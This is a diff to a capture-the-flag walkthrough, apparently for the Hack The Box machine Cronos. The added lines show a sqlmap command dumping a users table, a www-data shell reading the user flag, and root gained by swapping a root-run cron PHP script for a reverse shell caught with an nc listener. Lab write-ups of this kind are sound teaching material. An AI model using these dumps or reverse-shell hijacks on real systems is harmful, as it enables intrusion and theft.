@@ -179,6 +179,7 @@ Table: users
 
 And finally the username and password
 
+```
 $ sqlmap -u 'http://admin.cronos.htb/index.php' --data="username=hacked&password=server&form=submit" --dbms=mysql --dump -D admin -T users
 
 		...
@@ -257,6 +258,16 @@ Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64
 www-data@cronos:/var/www/admin$
 ```
 
+With this user we can fetch the user flag
+
+```
+www-data@cronos:/var/www/admin$ ls -al /home/noulis/user.txt
+ls -al /home/noulis/user.txt
+-r--r--r-- 1 noulis noulis 33 Mar 22  2017 /home/noulis/user.txt
+www-data@cronos:/var/www/admin$
+```
+
+
 While looking around in our initial directory there is a file config.php that gives us directions for the database access
 
 ```
@@ -271,6 +282,8 @@ cat config.php
 ?>
 ```
 
+This seems not to be necessary info though.
+
 With psspy we can identify some scheduled activities that might be of interest
 
 ```
@@ -283,6 +296,21 @@ With psspy we can identify some scheduled activities that might be of interest
 
 ## Privilege Escalation www-data to noulis
 
+Php-script /var/www/laravel/artisan is executed periodically as a root. We also have write permissions to it. Replace the script by php reverse shell, wait for the next execution, and our listener gets a shell
+
+```
+$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [10.10.14.51] from (UNKNOWN) [10.129.172.234] 53014
+Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 20:50:01 up  4:28,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# ls -al /root/root.txt
+-r-------- 1 root root 33 Mar 22  2017 /root/root.txt
+#
+```
 
 
 
